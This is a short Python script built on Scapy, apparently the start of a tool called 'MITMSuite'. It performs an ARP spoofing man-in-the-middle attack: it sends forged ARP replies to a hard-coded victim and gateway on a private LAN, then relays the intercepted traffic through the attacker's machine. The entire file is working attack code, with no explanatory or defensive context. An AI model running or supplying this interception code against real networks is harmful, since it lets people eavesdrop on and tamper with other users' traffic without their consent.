from scapy.all import *
import threading
from scapy.layers.l2 import *


def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(packet, timeout=1, verbose=0)
    if answered:
        return answered[0][1].hwsrc
    return None

def spoof(target_ip, gateway_ip, target_mac, gateway_mac, my_mac):
    packet_to_victim = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=my_mac)
    packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=my_mac)
    sendp(packet_to_victim, verbose=False)
    sendp(packet_to_gateway, verbose=False)

def forward_packet(packet, target_mac, gateway_mac, target_ip, my_mac):
    if not packet.haslayer(Ether):
        return

    if packet[Ether].src == target_mac:
        packet[Ether].src = my_mac
        packet[Ether].dst = gateway_mac
        sendp(packet, verbose=False)

    elif packet[Ether].src == gateway_mac and packet.haslayer(IP) and packet[IP].dst == target_ip:
        packet[Ether].src = my_mac
        packet[Ether].dst = target_mac
        sendp(packet, verbose=False)


def enable_forwarding(target_mac, gateway_mac, target_ip, my_mac):
    sniff(
        filter="not arp",
        prn=lambda pkt: forward_packet(pkt, target_mac, gateway_mac, target_ip, my_mac),
        store=0)

def main():
    gateway_ip = "192.168.10.1"
    gateway_mac = get_mac(gateway_ip)
    victim_ip = "192.168.10.133"
    victim_mac = get_mac(victim_ip)
    my_mac = get_if_hwaddr(conf.iface)
    my_ip = get_if_addr(conf.iface)
    print("Welcome to MITMSuite")
    forwading_thread = threading.Thread(target=enable_forwarding, args=(victim_mac, gateway_mac, victim_ip, my_mac))
    forwading_thread.deamon = True
    forwading_thread.start()
    spoof(victim_ip, gateway_ip, victim_mac, gateway_mac, my_mac)
    while True:
        command = input(">> ")

if __name__ == "__main__":
    main()